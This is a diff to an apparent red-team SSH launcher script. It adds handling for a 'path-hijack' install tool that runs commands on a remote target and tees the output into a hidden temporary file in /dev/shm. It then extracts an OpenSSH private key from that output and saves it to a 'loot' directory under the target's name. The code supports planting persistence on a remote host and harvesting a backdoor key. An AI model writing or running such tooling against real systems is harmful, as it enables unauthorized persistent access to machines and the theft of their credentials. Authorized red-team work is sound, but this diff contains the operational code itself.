@@ -280,8 +280,37 @@ info "Tool:    $TOOL  ($REL_PATH)"
 [[ $VERBOSE -eq 1 ]]         && hdr "Remote command" && echo "$REMOTE_CMD"
 echo
 
-if [[ -n "$SSH_PASS" ]]; then
-    sshpass -p "$SSH_PASS" ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
+# ── path-hijack install: tee output so we can save the generated private key ──
+_SAVE_KEY=0
+if [[ ("$TOOL" == "path-hijack" || "$TOOL" == "path-hijack-user") \
+      && "${TOOL_ARGS[0]:-}" == "install" ]]; then
+    _SAVE_KEY=1
+fi
+
+_run_ssh() {
+    if [[ -n "$SSH_PASS" ]]; then
+        sshpass -p "$SSH_PASS" ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
+    else
+        ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
+    fi
+}
+
+if [[ $_SAVE_KEY -eq 1 ]]; then
+    _SSH_OUT=$(mktemp /dev/shm/.rt-key-XXXXXXXX)
+    trap 'rm -f "$_SSH_OUT"' EXIT
+    _run_ssh | tee "$_SSH_OUT"
+    _SSH_RC=${PIPESTATUS[0]}
+    # Extract the private key block and save it
+    _KEY=$(sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' "$_SSH_OUT")
+    if [[ -n "$_KEY" ]]; then
+        mkdir -p "${RT_DIR}/loot"
+        _KEYFILE="${RT_DIR}/loot/path-hijack_${TARGET//[@:.]/_}_ed25519"
+        printf '%s\n' "$_KEY" > "$_KEYFILE"
+        chmod 600 "$_KEYFILE"
+        info "Private key saved → ${_KEYFILE}"
+    fi
+    rm -f "$_SSH_OUT"
+    exit $_SSH_RC
 else
-    ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
+    _run_ssh
 fi
